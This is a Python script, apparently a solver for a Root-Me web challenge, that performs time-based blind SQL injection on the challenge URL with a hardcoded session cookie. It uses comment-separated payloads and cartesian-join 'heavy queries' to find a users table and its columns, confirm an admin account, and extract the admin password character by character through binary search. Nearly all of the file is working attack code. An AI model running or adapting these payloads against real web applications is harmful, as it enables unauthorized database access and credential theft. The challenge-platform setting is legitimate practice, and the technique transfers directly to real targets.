import requests
import time
import sys

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_time(payload):
    """Prueba payload con time-based"""
    full = f"login'/**/AND/**/{payload}/**/-- -"
    params = {"action": full}
    inicio = time.time()
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
        return time.time() - inicio
    except Exception as e:
        print(f"Error: {e}")
        return 0

def condition_true(cond, heavy_query=None):
    """Evalúa si una condición es TRUE (time-based)"""
    if heavy_query is None:
        # Usamos la tabla users para heavy query
        heavy = "(SELECT/**/COUNT(*)/**/FROM/**/users,users/**/T1,users/**/T2,users/**/T3)"
    else:
        heavy = heavy_query
    
    payload = f"IF({cond},{heavy},0)"
    t = test_time(payload)
    return t > 3.0

print("="*70)
print("  PROBANDO HEAVY QUERY CON TABLA USERS")
print("="*70)

# 1. Encontrar el nombre correcto de la tabla
print("\n[1] Buscando tabla de usuarios...")
tablas = ['users', 'usuarios', 'member', 'members', 'admin', 'administradores', 'user']
tabla_encontrada = None

for tabla in tablas:
    heavy = f"(SELECT/**/COUNT(*)/**/FROM/**/{tabla},{tabla}/**/T1,{tabla}/**/T2,{tabla}/**/T3)"
    print(f"  Probando tabla: {tabla}")
    
    # Probar si la tabla existe (condición TRUE con heavy query)
    t = test_time(f"1=1/**/AND/**/{heavy}")
    baseline = test_time("1=1")
    
    print(f"    Heavy: {t:.2f}s, Baseline: {baseline:.2f}s")
    
    if t > baseline + 2:
        print(f"  ✅ ¡Tabla encontrada!: {tabla}")
        tabla_encontrada = tabla
        break
    time.sleep(0.5)

if not tabla_encontrada:
    print("  ❌ No se encontró ninguna tabla")
    sys.exit(1)

# 2. Encontrar columnas
print(f"\n[2] Buscando columnas en {tabla_encontrada}...")

# Primero, obtener la estructura con ORDER BY
print("  Usando ORDER BY para encontrar número de columnas...")
for i in range(1, 10):
    payload = f"1 ORDER BY {i}"
    params = {"action": "member", "member": payload}
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=5)
        if "error" in r.text.lower() or "sql" in r.text.lower():
            print(f"    Límite de columnas: {i-1}")
            num_cols = i - 1
            break
    except:
        pass
    time.sleep(0.3)

# Buscar columnas de usuario y contraseña
columnas = ['username', 'user', 'login', 'name', 'admin', 'usuario', 'email']
columna_user = None

print("  Buscando columna de usuario...")
for col in columnas:
    # Usar la técnica de tiempo con EXISTS
    heavy = f"(SELECT/**/COUNT(*)/**/FROM/**/{tabla_encontrada},{tabla_encontrada}/**/T1,{tabla_encontrada}/**/T2,{tabla_encontrada}/**/T3)"
    cond = f"EXISTS(SELECT/**/{col}/**/FROM/**/{tabla_encontrada})"
    
    t = test_time(f"IF({cond},{heavy},0)")
    baseline = test_time("1=1")
    
    print(f"    Probando {col}: {t:.2f}s vs {baseline:.2f}s")
    
    if t > baseline + 2:
        print(f"  ✅ Columna de usuario: {col}")
        columna_user = col
        break
    time.sleep(0.3)

columnas_pass = ['password', 'pass', 'clave', 'contrasena', 'pwd', 'pw']
columna_pass = None

print("  Buscando columna de contraseña...")
for col in columnas_pass:
    heavy = f"(SELECT/**/COUNT(*)/**/FROM/**/{tabla_encontrada},{tabla_encontrada}/**/T1,{tabla_encontrada}/**/T2,{tabla_encontrada}/**/T3)"
    cond = f"EXISTS(SELECT/**/{col}/**/FROM/**/{tabla_encontrada})"
    
    t = test_time(f"IF({cond},{heavy},0)")
    baseline = test_time("1=1")
    
    print(f"    Probando {col}: {t:.2f}s vs {baseline:.2f}s")
    
    if t > baseline + 2:
        print(f"  ✅ Columna de contraseña: {col}")
        columna_pass = col
        break
    time.sleep(0.3)

if not columna_user or not columna_pass:
    print("  ❌ No se encontraron columnas")
    sys.exit(1)

# 3. Verificar que el admin existe
print(f"\n[3] Verificando usuario admin...")
heavy = f"(SELECT/**/COUNT(*)/**/FROM/**/{tabla_encontrada},{tabla_encontrada}/**/T1,{tabla_encontrada}/**/T2,{tabla_encontrada}/**/T3)"
cond = f"EXISTS(SELECT/**/*/**/FROM/**/{tabla_encontrada}/**/WHERE/**/{columna_user}='admin')"

t = test_time(f"IF({cond},{heavy},0)")
if t > 3:
    print("  ✅ Usuario admin existe")
else:
    print("  ❌ Usuario admin no existe")
    sys.exit(1)

# 4. Extraer la contraseña del admin
print(f"\n[4] Extrayendo contraseña del admin...")

def extract_char(pos, heavy_query):
    """Extrae un carácter usando búsqueda binaria"""
    low, high = 32, 126  # Caracteres imprimibles
    
    while low <= high:
        mid = (low + high) // 2
        cond = f"ASCII(SUBSTRING((SELECT/**/{columna_pass}/**/FROM/**/{tabla_encontrada}/**/WHERE/**/{columna_user}='admin'),{pos},1))>{mid}"
        
        t = test_time(f"IF({cond},{heavy_query},0)")
        
        if t > 3:
            low = mid + 1
        else:
            high = mid - 1
    
    return chr(low)

# Primero obtener longitud
print("  Obteniendo longitud...")
longitud = 0
for i in range(1, 50):
    cond = f"LENGTH((SELECT/**/{columna_pass}/**/FROM/**/{tabla_encontrada}/**/WHERE/**/{columna_user}='admin'))={i}"
    t = test_time(f"IF({cond},{heavy},0)")
    if t > 3:
        longitud = i
        print(f"  ✅ Longitud: {longitud}")
        break
    print(f"    Probando longitud {i}: {t:.2f}s")

if longitud == 0:
    print("  ❌ No se pudo obtener la longitud")
    sys.exit(1)

# Extraer cada carácter
print("\n  Extrayendo caracteres...")
password = ""
for pos in range(1, longitud + 1):
    char = extract_char(pos, heavy)
    password += char
    print(f"  [{pos}/{longitud}] '{char}' (ASCII: {ord(char)})")
    print(f"  Progreso: {password}")

print(f"\n{'='*70}")
print(f"[+] ¡CONTRASEÑA ENCONTRADA!: {password}")
print(f"{'='*70}")
